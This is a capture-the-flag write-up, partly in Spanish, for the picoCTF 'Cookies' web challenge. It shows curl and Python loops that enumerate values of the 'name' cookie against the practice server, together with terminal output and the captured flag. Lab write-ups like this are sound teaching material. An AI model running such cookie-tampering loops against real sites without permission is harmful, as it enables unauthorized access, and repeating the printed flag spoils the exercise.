### Cookies
### Description 

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)
### Hint

- (None)

## Solución  1
```
	se puede intrerpretar como un ataque al coockie llamada name, donde enviaremos valores para encontrar nuestra bandera, mediante uso de un ciclo for para poder enviar varios
		el curl -s hace una solicitud http silenciosa
		

</html>root@LAPTOP-05MLJNS4:~# for i in {1..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i";   ne |
> for i in {1..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done | grep PicoCTF{
(23) Failed writing body
root@LAPTOP-05MLJNS4:~# for i in {1..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done |    for i in {1..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done | grep picoCTF{
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>

```
## Solución 2
```

import requests

import re

  

url = "http://mercury.picoctf.net:21485/check"

  

for i in range (20):

    cookies = {'name': str(i)}

    r = requests.get(url, cookies=cookies)

    print(r.text)

  

    if 'picoCTF' in r.text:

        print(r.text)

        flag = re.findall('picoCTF{.*?}',r.text)[0]

        print("Flag encontrada:", flag)

        break

        </footer>

    </div>
</body>

</html>
Flag encontrada: picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
       ```